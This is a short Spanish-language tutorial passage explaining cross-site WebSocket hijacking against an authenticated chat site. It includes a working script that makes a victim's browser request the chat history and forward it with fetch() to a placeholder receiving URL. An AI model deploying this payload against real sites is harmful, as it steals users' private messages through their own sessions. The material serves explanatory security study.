Para explicar esta vulnerabilidad pongámonos en el contexto de una pagina con una función de chat por medio de WebSocket, nuestra victima está autenticada a esta pagina y tiene un historial de chats.

Este ataque es similar a un CSRF, consiste en hacer que una victima ingrese a un sitio malicioso, este sitio va a enviar una petición por WebSocket, y como la victima que entre nuestra pagina maliciosa ya está loggeada en la pagina destino, se van a enviar sus session cookies al hacer la llamada de WebSocket, si en dado caso el servidor envía el historial de chats al enviar alguna cadena concreta, podemos explotar esto y hacer que la victima envié una petición con esta cadena sin su consentimiento y nosotros recibir esa información, el código en nuestro sitio malicioso seria el siguiente:

```html
<script>
	var coneccion = new WebSocket('URL-Web-Socket');
	coneccion.onopen = function(){
		coneccion.send('READY'); // En este caos uso 'READY' ya que esta cadena provoca que els ervidor devuelva el historial de chats 
	}
	
	coneccion.onmessage = function(mensajes){
		fetch('URL-PARA-RECIBIR-DATOS', {method: 'POST', mode: 'no-cors', body: mensajes.data})
	};
</script>
```

